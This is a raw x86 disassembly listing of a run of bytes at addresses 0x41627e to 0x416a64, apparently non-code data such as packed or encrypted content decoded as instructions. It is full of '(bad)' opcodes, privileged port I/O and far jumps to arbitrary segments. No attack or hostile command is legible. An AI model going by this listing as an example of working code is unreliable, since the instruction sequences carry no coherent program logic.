  41627e:	stos   BYTE PTR es:[edi],al
  41627f:	and    eax,0xe3893147
  416284:	into   
  416285:	cmp    ch,ah
  416287:	or     DWORD PTR [esi+eiz*4-0x68],esp
  41628b:	lds    esp,FWORD PTR [esp+esi*2-0xb]
  41628f:	enter  0xe5cb,0xd5
  416293:	jno    0x41621f
  416295:	adc    edi,DWORD PTR [ebx-0x20]
  416298:	cmp    DWORD PTR [esi-0x7e],0x5683c8fe
  41629f:	ins    BYTE PTR es:[edi],dx
  4162a0:	jg     0x4162dc
  4162a2:	add    eax,edi
  4162a4:	in     eax,0xf
  4162a6:	push   0xffffffb8
  4162a8:	mov    eax,0x533a3e3d
  4162ad:	pusha  
  4162ae:	push   0x49af9aa4
  4162b3:	bswap  esp
  4162b5:	jne    0x4162a1
  4162b7:	dec    esp
  4162b8:	js     0x4162ea
  4162ba:	into   
  4162bb:	arpl   WORD PTR [edi],dx
  4162bd:	push   esp
  4162be:	ret    0xf190
  4162c1:	popa   
  4162c2:	mov    DWORD PTR [eax-0x3e],ecx
  4162c5:	cmp    DWORD PTR [ebp+0xd],ebx
  4162c8:	and    al,0xe1
  4162ca:	out    0x4b,eax
  4162cc:	les    eax,FWORD PTR gs:[eax+0x7e]
  4162d0:	test   eax,0x4fe9322b
  4162d5:	adc    DWORD PTR [ebp+eax*8-0x1c],ebp
  4162d9:	lea    esi,[esi+0x4a]
  4162dc:	imul   ebp,DWORD PTR [eax+0x2017ea1f],0xffffffb7
  4162e3:	jb     0x416357
  4162e5:	cwde   
  4162e6:	push   edi
  4162e7:	jle    0x416342
  4162e9:	push   esi
  4162ea:	jp     0x416325
  4162ec:	mov    eax,0x6aaa0a52
  4162f1:	popf   
  4162f2:	jnp    0x416285
  4162f4:	adc    DWORD PTR [eax+0x2bc9a0a],ebp
  4162fa:	dec    ebp
  4162fb:	ja     0x4162cb
  4162fd:	pop    edx
  4162fe:	dec    edi
  4162ff:	jle    0x4162af
  416301:	fisubr WORD PTR [ecx]
  416303:	popf   
  416304:	jbe    0x416349
  416306:	mov    cs:0xe1192586,al
  41630c:	mov    ebp,0x45ce296e
  416311:	cmp    cl,bh
  416313:	les    esi,FWORD PTR [ecx+0x4c2a3ddc]
  416319:	inc    ebx
  41631a:	leave  
  41631b:	js     0x41639c
  41631d:	into   
  41631e:	cli    
  41631f:	xchg   DWORD PTR [edi-0x2],ecx
  416322:	adc    ch,dh
  416324:	js     0x4163a5
  416326:	sub    ebx,DWORD PTR [edx+0x5a96399f]
  41632c:	mov    cs,ecx
  41632e:	sbb    eax,0xa2ad979
  416333:	xlat   BYTE PTR ds:[ebx]
  416334:	shr    DWORD PTR [esp+ebp*2+0x10],0x1b
  416339:	ficom  DWORD PTR [edi+0x78]
  41633c:	mov    dl,0xe3
  41633e:	mov    edx,0x868075e9
  416343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416344:	xor    cl,BYTE PTR [edi]
  416346:	sub    cl,BYTE PTR [ebx]
  416348:	scas   al,BYTE PTR es:[edi]
  416349:	mov    esi,0x10f0d1d5
  41634e:	test   eax,0xcfd690be
  416353:	or     ah,ch
  416355:	js     0x4163b6
  416357:	dec    ebx
  416358:	ret    0x50ea
  41635b:	out    dx,al
  41635c:	dec    ebx
  41635d:	sbb    DWORD PTR [eax+0x1c],ebx
  416360:	add    eax,0xd8af5b67
  416365:	ffreep st(2)
  416367:	imul   BYTE PTR [eax+0x5e]
  41636a:	mov    dh,0x1c
  41636c:	packssdw mm4,mm7
  41636f:	or     edi,ecx
  416371:	mov    al,0x93
  416373:	clc    
  416374:	dec    ebx
  416375:	cs hlt 
  416377:	sbb    BYTE PTR [ecx],cl
  416379:	sub    eax,0x9f8794b8
  41637e:	icebp  
  41637f:	xchg   ecx,eax
  416380:	cmp    eax,0x4961c6b0
  416385:	leave  
  416386:	imul   eax,esi,0x41
  416389:	scas   al,BYTE PTR es:[edi]
  41638a:	add    BYTE PTR ds:0x7772b0f7,ch
  416390:	cdq    
  416391:	sti    
  416392:	mov    DWORD PTR [eax+esi*8+0x18555dce],edi
  416399:	ret    
  41639a:	test   al,0x95
  41639c:	jb     0x4163eb
  41639e:	add    edi,DWORD PTR [edi+0x23622208]
  4163a4:	dec    ebx
  4163a5:	pop    ds
  4163a6:	enter  0x92e7,0x88
  4163aa:	in     al,dx
  4163ab:	xchg   esi,eax
  4163ac:	add    eax,0x1ea95d81
  4163b1:	ss dec ebx
  4163b3:	cs cwde 
  4163b5:	mov    ecx,ebx
  4163b7:	lds    eax,FWORD PTR ds:0x804e
  4163bc:	repz dec edx
  4163be:	mul    DWORD PTR [esi]
  4163c0:	in     eax,dx
  4163c1:	gs bnd jge 0x416432
  4163c5:	sbb    eax,0x4665ca40
  4163ca:	xor    BYTE PTR [esi-0x56],0xc4
  4163ce:	push   ds
  4163cf:	jecxz  0x416372
  4163d1:	jecxz  0x4163eb
  4163d3:	xor    BYTE PTR [ebp+ebp*8+0x51694903],ah
  4163da:	cmp    al,0xe3
  4163dc:	cmp    BYTE PTR [edx+0x70],bl
  4163df:	fisttp WORD PTR [edx+0x22e93e92]
  4163e5:	jl     0x4163d6
  4163e7:	xchg   esp,eax
  4163e8:	xchg   ebp,eax
  4163e9:	pop    edx
  4163ea:	shl    eax,cl
  4163ec:	fistp  DWORD PTR [eax-0xd421218]
  4163f2:	or     eax,0xbd1ba6cb
  4163f7:	and    BYTE PTR [ebp+0x25],cl
  4163fa:	aam    0xcb
  4163fc:	aad    0xc9
  4163fe:	xchg   DWORD PTR [esi+edx*8+0x1d],ebp
  416402:	fmul   QWORD PTR [edi]
  416404:	lods   eax,DWORD PTR ds:[esi]
  416405:	mov    ebx,0x90651c45
  41640a:	mov    cs,WORD PTR [eax]
  41640c:	pop    edi
  41640d:	fnsave [edi]
  41640f:	ins    BYTE PTR es:[edi],dx
  416410:	scas   al,BYTE PTR es:[edi]
  416411:	jge    0x416405
  416413:	mov    BYTE PTR [ebx+ebp*2],cl
  416416:	jbe    0x416444
  416418:	and    DWORD PTR [ecx+0x6f],ebp
  41641b:	enter  0xf6b6,0xe9
  41641f:	in     eax,0xae
  416421:	or     esi,edx
  416423:	sar    BYTE PTR [edi],1
  416425:	add    DWORD PTR [esp+ecx*2+0xe1718e],esp
  41642c:	(bad)  
  41642d:	cmp    DWORD PTR [esp+edi*8],ebp
  416430:	mov    ch,0x14
  416432:	mov    ds:0x7e887659,eax
  416437:	dec    esp
  416438:	push   ebp
  416439:	push   0x3edfd15e
  41643e:	jmp    DWORD PTR ds:0x73331c20
  416444:	popf   
  416445:	sub    eax,0xdbf12caf
  41644a:	leave  
  41644b:	mov    BYTE PTR [eax],cl
  41644d:	mov    bh,0x1b
  41644f:	push   edx
  416450:	or     eax,DWORD PTR [edx]
  416452:	pushf  
  416453:	aaa    
  416454:	add    ebp,ebx
  416456:	adc    ah,al
  416458:	fwait
  416459:	call   0x10c0:0xe28ee1e0
  416460:	es pop esi
  416462:	bound  ebx,QWORD PTR [ecx]
  416464:	sub    DWORD PTR [edx-0x4f],0x5229fb27
  41646b:	mov    eax,0xcf5f097c
  416470:	ficomp DWORD PTR [edx-0x1adbbd41]
  416476:	sbb    esi,DWORD PTR [ebp-0x6936ff11]
  41647c:	mov    edi,0xb1da55a7
  416481:	mov    edi,0xb640031c
  416486:	mov    ah,cl
  416488:	or     eax,DWORD PTR [ecx]
  41648a:	stos   BYTE PTR es:[edi],al
  41648b:	mov    edx,0xc34bf9ac
  416490:	adc    eax,DWORD PTR [ebx-0x7]
  416493:	jg     0x4164e6
  416495:	cli    
  416496:	mov    edi,fs
  416498:	out    dx,al
  416499:	sbb    DWORD PTR [eax+0x5b],ebp
  41649c:	retf   
  41649d:	popf   
  41649e:	aam    0xc3
  4164a0:	lds    ebp,FWORD PTR [edx+0xa]
  4164a3:	ror    DWORD PTR [ebp-0x52],0x2f
  4164a7:	mov    DWORD PTR [esi+0x4b],esi
  4164aa:	cld    
  4164ab:	dec    ecx
  4164ac:	pusha  
  4164ad:	mov    ch,bh
  4164af:	js     0x41647b
  4164b1:	pusha  
  4164b2:	mov    dl,BYTE PTR [edx+ebx*2+0x4c]
  4164b6:	scas   al,BYTE PTR es:[edi]
  4164b7:	xchg   DWORD PTR [edx],ebp
  4164b9:	xchg   esp,eax
  4164ba:	cmp    al,0xbd
  4164bc:	push   es
  4164bd:	retf   
  4164be:	mov    esp,0x8e2fadaa
  4164c3:	lods   eax,DWORD PTR ds:[esi]
  4164c4:	loope  0x4164bf
  4164c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164c7:	pop    es
  4164c8:	inc    edx
  4164c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164ca:	std    
  4164cb:	(bad)  
  4164cc:	imul   edi,DWORD PTR [ecx],0x4
  4164cf:	mov    ch,0x6b
  4164d1:	lods   eax,DWORD PTR ds:[esi]
  4164d2:	rol    BYTE PTR [eax+0x6f4be38c],cl
  4164d8:	outs   dx,DWORD PTR ds:[esi]
  4164d9:	fld    TBYTE PTR [ebp-0x33]
  4164dc:	jl     0x4164b1
  4164de:	xor    BYTE PTR [edx-0x7973de6f],bl
  4164e4:	mov    eax,0xa556bfc
  4164e9:	dec    esp
  4164ea:	sbb    al,0x18
  4164ec:	pusha  
  4164ed:	xchg   ebp,eax
  4164ee:	xlat   BYTE PTR ds:[ebx]
  4164ef:	retf   0x1866
  4164f2:	retf   0xc1ee
  4164f5:	gs pop edx
  4164f7:	mov    edi,0xbf1a0766
  4164fc:	lock fdivr QWORD PTR [eax+0x74]
  416500:	(bad)  
  416501:	icebp  
  416502:	cmp    ebp,ecx
  416504:	pushf  
  416505:	jbe    0x416507
  416507:	fld    st(3)
  416509:	lahf   
  41650a:	das    
  41650b:	mov    esi,0x90a5fa20
  416510:	pop    esp
  416511:	repnz arpl WORD PTR gs:[bx+si-0x80],sp
  416517:	adc    esi,DWORD PTR [edi]
  416519:	push   eax
  41651a:	push   cs
  41651b:	xchg   ebx,eax
  41651c:	retf   
  41651d:	jmp    0xe376:0xd07e2b50
  416524:	dec    ebx
  416525:	es jae 0x416522
  416528:	cmp    bl,BYTE PTR [ebx]
  41652a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41652b:	imul   DWORD PTR [edi-0x1177fd04]
  416531:	dec    ebx
  416532:	pop    esi
  416533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416534:	std    
  416535:	call   0x261807fc
  41653a:	(bad)  
  41653b:	mov    ecx,0x4bb33a44
  416540:	mov    al,0x64
  416542:	cmc    
  416543:	pusha  
  416544:	fimul  WORD PTR [eax-0x183886b7]
  41654a:	out    0xc9,eax
  41654c:	pop    ecx
  41654d:	sub    DWORD PTR [ebx+0x55],ebp
  416550:	(bad)  
  416551:	retf   0x28e0
  416554:	repz pop edi
  416556:	mov    esi,0x3a000ee3
  41655b:	fist   DWORD PTR [ecx+0x60]
  41655e:	pushf  
  41655f:	jae    0x41653e
  416561:	mov    ds:0xb07b6b89,eax
  416566:	aaa    
  416567:	data16 sub al,0xc
  41656a:	mov    ch,0x8d
  41656c:	shl    BYTE PTR [eax+0x34cbdbee],0x89
  416573:	in     eax,dx
  416574:	add    dh,BYTE PTR ds:0x822e3e03
  41657a:	ins    DWORD PTR es:[edi],dx
  41657b:	dec    ebx
  41657c:	jno    0x416589
  41657e:	enter  0x22d4,0x5a
  416582:	data16 xor al,ah
  416585:	call   0xd029:0x4e901cc5
  41658c:	xor    BYTE PTR [eax+0x44],cl
  41658f:	sbb    eax,0x577cd871
  416594:	sbb    al,0x51
  416596:	xor    al,0x2f
  416598:	bound  edx,QWORD PTR [edi+0x2a651c8e]
  41659e:	call   0x55577b74
  4165a3:	repnz inc ecx
  4165a5:	adc    BYTE PTR [ebx],dl
  4165a7:	xor    al,0xf0
  4165a9:	mov    ds:0x7ea2e27b,al
  4165ae:	out    dx,al
  4165af:	pop    ecx
  4165b0:	arpl   bp,di
  4165b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165b3:	dec    ebp
  4165b4:	mov    bl,0x9e
  4165b6:	mov    edx,0x311cfb50
  4165bb:	call   0xffe16dc3
  4165c0:	mov    dl,0xad
  4165c2:	in     eax,dx
  4165c3:	add    bh,BYTE PTR [edi-0x29]
  4165c6:	data16 lods al,BYTE PTR ds:[esi]
  4165c8:	fldenv [edi]
  4165ca:	sub    ebx,DWORD PTR [esi+0x448c8b67]
  4165d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165d1:	dec    eax
  4165d2:	das    
  4165d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165d4:	add    al,0x47
  4165d6:	jg     0x416654
  4165d8:	les    ecx,FWORD PTR [eax-0x4c1ead9a]
  4165de:	or     BYTE PTR [edx],dl
  4165e0:	cmp    bl,BYTE PTR [eax+0x4d]
  4165e3:	nop
  4165e4:	pop    esi
  4165e5:	cmp    bh,BYTE PTR ss:[ebx-0x645435c8]
  4165ec:	push   ebp
  4165ed:	je     0x416634
  4165ef:	aas    
  4165f0:	or     esi,DWORD PTR [ecx]
  4165f2:	sbb    al,0x6c
  4165f4:	sub    edx,DWORD PTR [edi+0x33041254]
  4165fa:	fbstp  TBYTE PTR [edx+ecx*1]
  4165fd:	fdivr  DWORD PTR [edi+0x75]
  416600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416601:	push   edx
  416602:	push   0xfffffff6
  416604:	inc    esi
  416605:	inc    edi
  416606:	fist   DWORD PTR [edx+edx*1]
  416609:	mov    esp,0x64d7b3b0
  41660e:	shl    BYTE PTR [edi+0x6d],cl
  416611:	xchg   BYTE PTR [edx],ch
  416613:	jg     0x41667b
  416615:	adc    DWORD PTR ds:0x5374e330,edx
  41661b:	and    ebx,DWORD PTR [eax-0x7d]
  41661e:	mov    dl,0x95
  416620:	lahf   
  416621:	test   edx,ecx
  416623:	ds xor al,0xdb
  416626:	out    dx,eax
  416627:	xchg   edx,eax
  416628:	xor    ah,BYTE PTR [edi]
  41662a:	pop    edi
  41662b:	pop    ecx
  41662c:	sbb    al,0x56
  41662e:	clc    
  41662f:	popa   
  416630:	adc    ecx,esp
  416632:	cmp    esp,DWORD PTR [ebx-0x24]
  416635:	mov    cl,0x16
  416637:	mov    ?,ebp
  416639:	stos   BYTE PTR es:[edi],al
  41663a:	sub    al,0xa1
  41663c:	dec    DWORD PTR [ecx-0xa8cb86c]
  416642:	cmp    BYTE PTR [edi+0x54],dh
  416645:	xor    ebp,esi
  416647:	out    dx,eax
  416648:	fs sbb al,0x8b
  41664b:	jg     0x416672
  41664d:	mov    esi,0xb7940f36
  416652:	xchg   edi,eax
  416653:	xchg   ah,al
  416655:	mov    edx,0x7cb0eef
  41665a:	xchg   ebx,eax
  41665b:	in     eax,0x8
  41665d:	out    dx,eax
  41665e:	or     bh,BYTE PTR [eax]
  416660:	call   0x1cf929f7
  416665:	in     eax,dx
  416666:	sbb    BYTE PTR [edx],ah
  416668:	daa    
  416669:	xor    bl,BYTE PTR [edi]
  41666b:	cmp    eax,0xbf4d1e5
  416670:	cmp    ebp,0x0
  416673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416674:	(bad)  
  416675:	mov    dl,0xde
  416677:	push   ss
  416678:	fldenv [ebx-0x67d30c90]
  41667e:	dec    edx
  41667f:	cmp    ah,bh
  416681:	je     0x4166c6
  416683:	in     al,0xe0
  416685:	and    BYTE PTR [edi-0x35],bh
  416688:	xor    BYTE PTR [ecx+0x913cc07],0x6e
  41668f:	mov    eax,ebp
  416691:	adc    eax,0x8d4fdb15
  416696:	retf   0x5f66
  416699:	out    dx,eax
  41669a:	out    0x19,eax
  41669c:	div    DWORD PTR [eax+0x5f]
  41669f:	and    BYTE PTR [edi-0x164d096],0xfd
  4166a6:	fdivr  st,st(3)
  4166a8:	fsub   DWORD PTR [edi+0x34]
  4166ab:	sub    esp,DWORD PTR [ecx]
  4166ad:	(bad)  
  4166ae:	retf   
  4166af:	imul   edi,edx,0xc32a572b
  4166b5:	es xor eax,0xc0256133
  4166bb:	add    eax,0xcca05054
  4166c0:	push   esi
  4166c1:	imul   esi,edx,0x913c8ee4
  4166c7:	fs or  eax,0x2a86e77a
  4166cd:	ret    
  4166ce:	fiadd  WORD PTR [edx-0x46]
  4166d1:	or     al,0x6e
  4166d3:	mov    eax,0x11e1bff0
  4166d8:	out    0xcc,al
  4166da:	in     al,dx
  4166db:	scas   eax,DWORD PTR es:[edi]
  4166dc:	fwait
  4166dd:	jns    0x41667d
  4166df:	xor    DWORD PTR [esi+0x4d7e56ab],ebp
  4166e5:	and    BYTE PTR [edi-0x7b],0xbc
  4166e9:	inc    esp
  4166ea:	add    DWORD PTR [edi+eax*1],0xcdc2616
  4166f1:	pushf  
  4166f2:	and    al,0x20
  4166f4:	xchg   edx,eax
  4166f5:	mov    bl,0xc8
  4166f7:	pop    edx
  4166f8:	loop   0x4166e7
  4166fa:	sbb    eax,0x2409b90d
  4166ff:	adc    ch,al
  416701:	dec    eax
  416702:	jmp    0xc4f6:0x677db3a6
  416709:	out    dx,eax
  41670a:	sbb    al,0x8a
  41670c:	sbb    dl,al
  41670e:	mov    WORD PTR [edx],es
  416710:	clc    
  416711:	mov    ch,0xd9
  416713:	adc    ecx,0x79961f92
  416719:	sbb    ecx,DWORD PTR [ecx-0x32]
  41671c:	inc    edi
  41671d:	outs   dx,DWORD PTR ds:[esi]
  41671e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41671f:	ror    BYTE PTR [edi],cl
  416721:	cld    
  416722:	(bad)  
  416723:	mov    dl,0x28
  416725:	xor    edx,DWORD PTR [ebp-0x37463799]
  41672b:	mov    ebp,0xbab54fdc
  416730:	adc    eax,DWORD PTR [edx]
  416732:	or     al,0x7a
  416734:	and    eax,0xff249d99
  416739:	ds inc eax
  41673b:	stos   DWORD PTR es:[edi],eax
  41673c:	pusha  
  41673d:	pop    ss
  41673e:	push   es
  41673f:	mov    ebx,0xd88b8675
  416744:	(bad)  
  416745:	cwde   
  416746:	lea    esi,[esi-0x7e]
  416749:	jmp    0x8896fee2
  41674e:	sar    DWORD PTR [edx],1
  416750:	add    BYTE PTR [ebp+0x19],dl
  416753:	cmp    bl,dl
  416755:	clc    
  416756:	das    
  416757:	inc    eax
  416758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416759:	mov    cl,bl
  41675b:	mov    ?,WORD PTR [eax-0x2ca0865d]
  416761:	mov    DWORD PTR [eax-0x6f],ecx
  416764:	add    DWORD PTR [edi+0x44],edx
  416767:	(bad)  
  416768:	sub    al,0xd9
  41676a:	and    eax,0xa587ae67
  41676f:	jne    0x416719
  416771:	sub    DWORD PTR [edi],ebx
  416773:	mov    dl,0xc4
  416775:	leave  
  416776:	xchg   ebx,eax
  416777:	and    BYTE PTR [eax],ch
  416779:	adc    eax,0x8d90db32
  41677e:	jl     0x416799
  416780:	cld    
  416781:	inc    esi
  416782:	push   eax
  416783:	or     cl,BYTE PTR [ebp+0x5fa9bd92]
  416789:	mov    dh,0xd4
  41678b:	push   ebx
  41678c:	mov    ds:0xbaba8807,al
  416791:	nop
  416792:	ss cs adc eax,esi
  416796:	sbb    al,0x86
  416798:	imul   esi,DWORD PTR [edi+ebp*4+0x7cba598a],0x1edd0e87
  4167a3:	lods   eax,DWORD PTR ds:[esi]
  4167a4:	jnp    0x4167f4
  4167a6:	cmp    eax,0x77324b2a
  4167ab:	scas   al,BYTE PTR es:[edi]
  4167ac:	in     al,0x5c
  4167ae:	inc    esi
  4167af:	stos   DWORD PTR es:[edi],eax
  4167b0:	inc    ebx
  4167b1:	pop    esp
  4167b2:	das    
  4167b3:	(bad)  
  4167b5:	inc    ecx
  4167b6:	outs   dx,BYTE PTR ds:[esi]
  4167b7:	cmp    DWORD PTR [edx],ebx
  4167b9:	mov    dh,0xfa
  4167bb:	addr16 push ecx
  4167bd:	cmp    bl,BYTE PTR [esi]
  4167bf:	aaa    
  4167c0:	imul   esi,DWORD PTR [esi-0x67c8aa94],0x5dc15775
  4167ca:	xchg   edi,eax
  4167cb:	push   0xffffff97
  4167cd:	les    edi,FWORD PTR [eax+0x70d42f10]
  4167d3:	(bad)  
  4167d4:	xchg   esi,eax
  4167d5:	idiv   BYTE PTR [ebx+0x7f8ec066]
  4167db:	jb     0x4167ce
  4167dd:	mov    DWORD PTR [ebx-0x24532ca6],0xbff67501
  4167e7:	outs   dx,DWORD PTR ds:[esi]
  4167e8:	mov    edx,0xe12f05fb
  4167ed:	or     al,0x78
  4167ef:	test   DWORD PTR [esi],edi
  4167f1:	ret    0xa305
  4167f4:	pshufw mm0,mm4,0xde
  4167f8:	mov    bl,0xc9
  4167fa:	inc    esp
  4167fb:	jne    0x416781
  4167fd:	xchg   DWORD PTR [edx+eax*2-0x4b],esi
  416801:	push   edi
  416802:	push   ebx
  416803:	mov    ch,0xb5
  416805:	pop    edx
  416806:	sbb    ecx,DWORD PTR [esi]
  416808:	in     al,0x8f
  41680a:	loope  0x41683f
  41680c:	ret    
  41680d:	mov    cl,dh
  41680f:	or     eax,0x41988a4b
  416814:	add    BYTE PTR [ecx+0x8ce37eb],cl
  41681a:	ret    
  41681b:	jmp    0x416862
  41681d:	bnd je 0x41685a
  416820:	cmp    ebp,esi
  416822:	(bad)  
  416823:	pop    ebx
  416824:	mov    eax,ds:0xbac7c869
  416829:	and    bh,ah
  41682b:	sbb    al,0x48
  41682d:	aam    0x1f
  41682f:	aaa    
  416830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416831:	xchg   ebp,ebx
  416833:	shr    BYTE PTR [ebx-0x2850a4d0],1
  416839:	xor    al,0x24
  41683b:	dec    esp
  41683c:	cmp    edx,ebx
  41683e:	push   0xffffff8f
  416840:	mov    eax,0xbdeacd50
  416845:	scas   al,BYTE PTR es:[edi]
  416846:	xchg   BYTE PTR [ecx],cl
  416848:	inc    ebx
  416849:	sub    DWORD PTR [ebx-0x12],ecx
  41684c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41684d:	in     al,0x26
  41684f:	jb     0x416809
  416851:	add    al,0x20
  416853:	mov    ah,0xc6
  416855:	or     DWORD PTR [ecx-0x55],0x14
  416859:	cwde   
  41685a:	aas    
  41685b:	adc    ebp,DWORD PTR [ecx-0xa]
  41685e:	mov    al,gs:0x1846442b
  416864:	xchg   bl,bh
  416866:	mov    ecx,0x641afb14
  41686b:	into   
  41686c:	jae    0x4168a3
  41686e:	and    eax,ecx
  416870:	sbb    ebx,ebx
  416872:	jle    0x4168ea
  416874:	xor    eax,0x7f8fc3f8
  416879:	sti    
  41687a:	out    dx,eax
  41687b:	pop    ss
  41687c:	cmp    eax,0xbc4bc267
  416881:	jge    0x416806
  416883:	sbb    al,0x6d
  416885:	xchg   DWORD PTR [eax],ebx
  416887:	jecxz  0x416893
  416889:	scas   eax,DWORD PTR es:[edi]
  41688a:	add    edi,esp
  41688c:	dec    ebp
  41688d:	sar    dh,0xed
  416890:	jmp    0x4168da
  416892:	mov    ds:0x869d23bf,al
  416897:	in     eax,dx
  416898:	div    BYTE PTR [edi+0x77]
  41689b:	push   ebp
  41689c:	and    BYTE PTR [ebp+0x649a93c4],dl
  4168a2:	or     esi,DWORD PTR [edx]
  4168a4:	(bad)  
  4168a5:	xor    DWORD PTR [ebx],0x5eda3f82
  4168ab:	in     al,dx
  4168ac:	jbe    0x4168ec
  4168ae:	mov    cs,WORD PTR [edi+0x78f3967]
  4168b4:	mov    eax,ds:0xd0c5a803
  4168b9:	out    0xfd,eax
  4168bb:	mov    edx,0x12e0bfcc
  4168c0:	clc    
  4168c1:	pop    ebx
  4168c2:	imul   esi,DWORD PTR [ecx+esi*4+0x650884a2],0x44
  4168ca:	clc    
  4168cb:	inc    edi
  4168cc:	lock cli 
  4168ce:	dec    eax
  4168cf:	out    dx,eax
  4168d0:	popa   
  4168d1:	test   DWORD PTR [edi-0x26318749],0xb63264d9
  4168db:	mov    edi,ecx
  4168dd:	jecxz  0x416865
  4168df:	fucomip st,st(3)
  4168e1:	adc    edi,DWORD PTR [esi-0xda06c7]
  4168e7:	add    eax,0x112f0f63
  4168ec:	cmp    al,0x3f
  4168ee:	cli    
  4168ef:	mov    ds:0x4e6194e2,al
  4168f4:	inc    ecx
  4168f5:	jp     0x4168f1
  4168f7:	xor    BYTE PTR [ecx+0x6ea291cd],cl
  4168fd:	js     0x41695a
  4168ff:	cmp    eax,0xa8d439e5
  416904:	dec    edx
  416905:	cwde   
  416906:	mov    ah,0x1e
  416908:	pop    ds
  416909:	mov    ebp,0x5df73a62
  41690e:	push   0x58
  416910:	call   DWORD PTR ds:0x481b647e
  416916:	cwde   
  416917:	loope  0x41698b
  416919:	push   ebp
  41691a:	xor    al,ah
  41691c:	mov    edi,DWORD PTR [ebx]
  41691e:	mov    edx,ecx
  416920:	call   0x9e55:0x39a576e8
  416927:	xor    ch,BYTE PTR [edi-0x60b89de1]
  41692d:	or     ah,BYTE PTR [edx+0x6f67e93]
  416933:	adc    ebx,DWORD PTR [ebx+0x36e877b8]
  416939:	and    ah,dh
  41693b:	sub    DWORD PTR [ecx],ebx
  41693d:	push   edi
  41693e:	pop    ecx
  41693f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416940:	enter  0x4409,0x91
  416944:	push   edx
  416945:	xor    ah,BYTE PTR [edx-0x4acdefa]
  41694b:	cdq    
  41694c:	(bad)  
  41694d:	push   ecx
  41694e:	push   cs
  41694f:	test   BYTE PTR [ecx+0x75ea871c],dh
  416955:	mov    ebx,0x20beae7f
  41695a:	(bad)  
  41695b:	pop    esp
  41695c:	in     al,dx
  41695d:	pop    ss
  41695e:	test   BYTE PTR [edi-0x6097c72c],0xd9
  416965:	iret   
  416966:	cld    
  416967:	jl     0x416960
  416969:	push   esi
  41696a:	dec    ebp
  41696b:	outs   dx,DWORD PTR ds:[esi]
  41696c:	push   esi
  41696d:	inc    ebp
  41696e:	scas   eax,DWORD PTR es:[edi]
  41696f:	push   es
  416970:	pop    ss
  416971:	popa   
  416972:	sub    esp,ecx
  416974:	jp     0x41697e
  416976:	std    
  416977:	cmc    
  416978:	shl    BYTE PTR [ecx+0x4f3b75c7],1
  41697e:	mov    ah,0x8
  416980:	or     BYTE PTR [edi],0x1b
  416983:	sbb    al,0x6b
  416985:	iret   
  416986:	adc    al,0x46
  416988:	mov    DWORD PTR [eax],ebx
  41698a:	add    eax,0x139ec954
  41698f:	retf   0x9e5e
  416992:	or     DWORD PTR [esi-0x741d03cf],esi
  416998:	cmp    al,0x28
  41699a:	cmp    al,0xfd
  41699c:	mov    ah,0x95
  41699e:	aaa    
  41699f:	repnz push eax
  4169a1:	test   BYTE PTR es:[esi+0x4e],ah
  4169a5:	mov    bl,0x9d
  4169a7:	mov    ebp,gs
  4169a9:	test   al,0x65
  4169ab:	add    bl,dl
  4169ad:	cli    
  4169ae:	or     al,0x4
  4169b0:	jle    0x416a0f
  4169b2:	mov    ecx,0x14e50058
  4169b7:	in     al,dx
  4169b8:	mov    bh,0xf5
  4169ba:	add    eax,DWORD PTR [ebx+ebx*1-0x1f381b77]
  4169c1:	dec    ebx
  4169c2:	test   al,0x6f
  4169c4:	jle    0x416a2f
  4169c6:	daa    
  4169c7:	jecxz  0x41698e
  4169c9:	pusha  
  4169ca:	int3   
  4169cb:	xor    esp,ebx
  4169cd:	enter  0x8780,0xb7
  4169d1:	jbe    0x4169de
  4169d3:	push   eax
  4169d4:	mov    dl,dl
  4169d6:	imul   esp,DWORD PTR [edx+0x56],0x58
  4169da:	test   al,0xdb
  4169dc:	xchg   ebx,eax
  4169dd:	jecxz  0x4169a7
  4169df:	outs   dx,DWORD PTR ds:[esi]
  4169e0:	imul   esp,DWORD PTR [esp+edx*2-0x3f85ddc0],0x74
  4169e8:	adc    BYTE PTR [eax+0xc],cl
  4169eb:	jae    0x416a19
  4169ed:	test   BYTE PTR [ebp-0x1c],bh
  4169f0:	scas   eax,DWORD PTR es:[edi]
  4169f1:	inc    esp
  4169f2:	sub    ebp,edi
  4169f4:	xchg   ebx,eax
  4169f5:	pop    esi
  4169f6:	arpl   WORD PTR ds:0x853c8063,bx
  4169fc:	cwde   
  4169fd:	jne    0x4169f0
  4169ff:	xchg   DWORD PTR ds:0x33f596b0,ecx
  416a05:	xchg   edx,eax
  416a06:	mov    ebp,0x8478da72
  416a0b:	test   eax,0x2dc444d0
  416a10:	inc    edi
  416a11:	cmp    eax,0x793a250c
  416a16:	es cli 
  416a18:	lods   al,BYTE PTR ds:[esi]
  416a19:	or     ebx,edi
  416a1b:	push   ebx
  416a1c:	dec    esp
  416a1d:	push   ss
  416a1e:	out    dx,eax
  416a1f:	xor    esp,esi
  416a21:	int    0x74
  416a23:	popf   
  416a24:	gs fwait
  416a26:	sbb    eax,0x92a9ffb
  416a2b:	in     eax,0x7c
  416a2d:	and    BYTE PTR [ecx-0x20],bl
  416a30:	xor    al,0xba
  416a32:	xchg   edx,eax
  416a33:	and    eax,0x9f06f44e
  416a38:	adc    BYTE PTR [edi+0x177906bc],ch
  416a3e:	xrelease xchg DWORD PTR [ecx],eax
  416a41:	test   ah,al
  416a43:	in     eax,0x53
  416a45:	das    
  416a46:	cmp    ecx,DWORD PTR [esi-0x5e]
  416a49:	retf   
  416a4a:	push   0x13b7f39c
  416a4f:	inc    esp
  416a50:	sub    edx,esp
  416a52:	repz ds call 0xde77:0x17db7b6e
  416a5b:	out    dx,eax
  416a5c:	ror    DWORD PTR [ebx*1+0x5bef5c3f],cl
  416a63:	stc    
  416a64:	push   cs
